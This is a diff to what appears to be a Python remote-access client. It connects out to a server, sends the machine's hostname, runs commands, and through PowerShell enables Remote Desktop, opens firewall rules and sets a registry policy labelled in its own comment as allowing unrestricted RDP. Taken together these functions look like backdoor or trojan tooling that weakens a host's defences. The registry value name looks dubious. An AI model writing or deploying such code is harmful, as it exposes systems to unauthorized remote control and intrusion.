@@ -1,6 +1,5 @@
 import socket
 import subprocess
-import platform
 import getpass
 import time
 
@@ -31,6 +30,7 @@ def connect_to_server(server_ip, port=12345):
         client_socket.connect((server_ip, port))
         # Send hostname to server
         hostname = socket.gethostname()
+        print(f"Sending hostname: {hostname}")
         client_socket.sendall(hostname.encode())
         return client_socket
     except (socket.timeout, socket.error) as e:
@@ -45,10 +45,21 @@ def execute_command(command):
         print(f"Command execution failed: {e}")
 
 def enable_rdp():
+    # Enable RDP and set up firewall rules
     command = """
     powershell -Command "
     Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0;
     Enable-NetFirewallRule -DisplayGroup 'Remote Desktop';
+    "
+    """
+    execute_command(command)
+    
+    # Set RDP to allow connections from any user (insecure)
+    command = """
+    powershell -Command "
+    $regPath = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services';
+    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+    Set-ItemProperty -Path $regPath -Name 'fAllowUnrestrictedRDP' -Value 1;
     "
     """
     execute_command(command)
